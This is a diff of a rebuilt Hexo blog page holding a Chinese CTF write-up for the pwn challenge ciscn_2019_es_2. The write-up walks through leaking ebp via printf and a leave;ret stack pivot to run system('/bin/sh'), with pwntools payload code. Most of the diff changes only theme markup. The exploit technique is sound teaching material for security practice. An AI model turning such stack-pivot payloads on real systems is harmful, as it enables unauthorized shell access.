@@ -4,7 +4,6 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="baidu-site-verification" content="codeva-1wZQQJBzcr" />
     <meta name="keywords" content="ciscn_2019_es_2, Linux，二进制，IoT，CTF">
     <meta name="description" content="libc泄露|栈劫持">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -19,17 +18,8 @@
 
 
     <title>ciscn_2019_es_2 | 8023</title>
-    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+    <link rel="icon" type="image/png" href="/favicon.png">
     
-    <style>
-        body{
-            background-image: url(/medias/featureimages/17.jpg);
-            background-repeat:no-repeat;
-            background-size: 100% 100%;
-            background-attachment:fixed;
-        }
-    </style>
-
 
 
     <!-- bg-cover style     -->
@@ -62,9 +52,7 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.1">
-<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-</head>
+<meta name="generator" content="Hexo 7.3.0"></head>
 
 
 <body>
@@ -248,7 +236,7 @@
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/Pr0b1em" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -305,7 +293,7 @@
     }
 </style>
 
-<a href="https://github.com/Pr0b1em" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -321,19 +309,6 @@
 </header>
 
     
-<script src="/libs/cryptojs/crypto-js.min.js"></script>
-<script>
-    (function() {
-        let pwd = '';
-        if (pwd && pwd.length > 0) {
-            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
-                alert('密码错误，将返回主页！');
-                location.href = '/';
-            }
-        }
-    })();
-</script>
-
 
 
 
@@ -400,7 +375,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    479
+                    487
                 </div>
                 
 
@@ -421,38 +396,15 @@
         </div>
         <hr class="clearfix">
 
-        <!-- 代码块功能依赖 -->
-        <script type="text/javascript" src="/libs/codeBlock/codeBlockFunction.js"></script>
-
-
-        <!-- 代码块复制 -->
-        
-        <script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-        
-
-        <!-- 代码块收缩 -->
-        
-        <script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-        
-
-        <!-- 代码块折行 -->
-        
-        <style type="text/css">
-        code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
-        </style>
         
 
         
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.min.css">
-        
-
 
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><p>检查保护机制，32位，开启NX</p>
 <p><img src="/img/image-20210628215206342.png"></p>
-<p>IDA打开，shift+F12查找字符串，发现sysytem函数，但没有/bin/sh，还是无法直接利用</p>
+<p>IDA打开，shift+F12查找字符串，发现sysytem函数，但没有&#x2F;bin&#x2F;sh，还是无法直接利用</p>
 <p><img src="/img/image-20210628215304461.png"></p>
 <p>找到system函数真实地址0x8048400</p>
 <p><img src="/img/image-20210628215541204.png"></p>
@@ -460,7 +412,7 @@
 <p><img src="/img/image-20210628215636474.png"></p>
 <p><img src="/img/image-20210628215644207.png"></p>
 <p>读入0x30字节数据给s，s大小是0x28，只能溢出0x8字节，覆盖到ret，没法构造太长的rop，但是这边可以给s写入2次数据。</p>
-<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>我们可以通过第一次输入来泄露程序里的ebp地址，知道了ebp的地址就能够推算出参数s在栈上的地址，第二次直接往栈上写入system（‘/bin/sh’），之后利用leave；ret的栈劫持去到参数s的栈，让它去执行我们布置在栈上的system（‘/bin/sh’）来获取shell。</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>我们可以通过第一次输入来泄露程序里的ebp地址，知道了ebp的地址就能够推算出参数s在栈上的地址，第二次直接往栈上写入system（‘&#x2F;bin&#x2F;sh’），之后利用leave；ret的栈劫持去到参数s的栈，让它去执行我们布置在栈上的system（‘&#x2F;bin&#x2F;sh’）来获取shell。</p>
 <h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>1.泄露ebp</p>
 <p>printf函数在输出时遇到’\0’会停止，若将s填满，这样在末尾就无法加上’\0’，就可以泄露ebp了</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x27</span><span class="token operator">+</span><span class="token string">'b'</span>
@@ -474,7 +426,7 @@ ebp<span class="token operator">=</span>u32<span class="token punctuation">(</sp
 <p><img src="/img/image-20210628221147958.png"></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">'aaaa'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sys<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>s<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>第一个’aaaa‘随便输入，如果一开始将system函数写第一个，那么我们在用leave；ret劫持栈的时候要抬高4字节<br>接着跟上system函数的地址<br>后面是执行完system函数后的返回地址，这边也可以随便写<br>之后是一个地址，这个地址指向的是我们写在栈上的’/bin/sh‘字符串</p>
+<p>第一个’aaaa‘随便输入，如果一开始将system函数写第一个，那么我们在用leave；ret劫持栈的时候要抬高4字节<br>接着跟上system函数的地址<br>后面是执行完system函数后的返回地址，这边也可以随便写<br>之后是一个地址，这个地址指向的是我们写在栈上的’&#x2F;bin&#x2F;sh‘字符串</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">payload2<span class="token operator">=</span>payload2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span>）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">payload2<span class="token operator">+=</span>p32<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -496,10 +448,8 @@ payload2<span class="token operator">=</span><span class="token string">b'aaaa'<
 payload2<span class="token operator">=</span>payload2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>
 payload2<span class="token operator">+=</span>p32<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>
 
-
 r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
-r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>cat flag</p>
 <p><img src="/img/image-20210628221613459.png"></p>
@@ -529,7 +479,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Pr0b1em.github.io/2021/06284f25.html">https://Pr0b1em.github.io/2021/06284f25.html</a>
+                    <a href="https://pr0b1em.github.io/2021/06284f25.html">https://pr0b1em.github.io/2021/06284f25.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -579,7 +529,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 <div id="article-share">
 
     
-    <div class="social-share" data-sites="qq,wechat" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
     <script src="/libs/share/js/social-share.min.js"></script>
     
 
@@ -749,50 +699,10 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 </div>
 
 
-<script>
-    $('#articleContent').on('copy', function (e) {
-        // IE8 or earlier browser is 'undefined'
-        if (typeof window.getSelection === 'undefined') return;
-
-        var selection = window.getSelection();
-        // if the selection is short let's not annoy our users.
-        if (('' + selection).length < Number.parseInt('120')) {
-            return;
-        }
-
-        // create a div outside of the visible area and fill it with the selected text.
-        var bodyElement = document.getElementsByTagName('body')[0];
-        var newdiv = document.createElement('div');
-        newdiv.style.position = 'absolute';
-        newdiv.style.left = '-99999px';
-        bodyElement.appendChild(newdiv);
-        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
-
-        // we need a <pre> tag workaround.
-        // otherwise the text inside "pre" loses all the line breaks!
-        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
-            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
-        }
-
-        var url = document.location.href;
-        newdiv.innerHTML += '<br />'
-            + '来源: 8023<br />'
-            + '文章作者: Pr0b1em<br />'
-            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
-            + '本文章著作权归作者Pr0b1em所有，任何形式的转载都请注明出处。';
-
-        selection.selectAllChildren(newdiv);
-        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
-    });
-</script>
-
 
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
-
-  <!-- 是否加载使用自带的 prismjs. -->
-  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
@@ -916,7 +826,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">43.8k</span>
+                        class="white-color">44.7k</span>
             
             
             
@@ -950,8 +860,8 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                         var startYear = "2021";
                         var startMonth = "6";
                         var startDate = "17";
-                        var startHour = "17";
-                        var startMinute = "30";
+                        var startHour = "0";
+                        var startMinute = "0";
                         var startSecond = "0";
                         var todayYear = today.getFullYear();
                         var todayMonth = today.getMonth() + 1;
@@ -996,7 +906,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
             
                 <span id="icp"><img src="/medias/icp.png"
                                     style="vertical-align: text-bottom;"/>
-                <a href="https://www.beian.gov.cn" target="_blank">渝ICP备2024047956号 | 渝公网安备50011702501074号</a>
+                <a href="https://beian.miit.gov.cn/" target="_blank">渝ICP备2024047956号-1</a> | <a href="https://www.beian.gov.cn" target="_blank">渝公网安备50011702501074号</a>
             </span>
             
         </div>
@@ -1251,8 +1161,14 @@ $(function () {
     
     <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
+
+
+    
+    <script src="/live2dw/lib/L2Dwidget.min.js"></script>
+    <script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script>
+    
     <script src="/js/FunnyTitle.js"></script>
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+</body>
 
 </html>
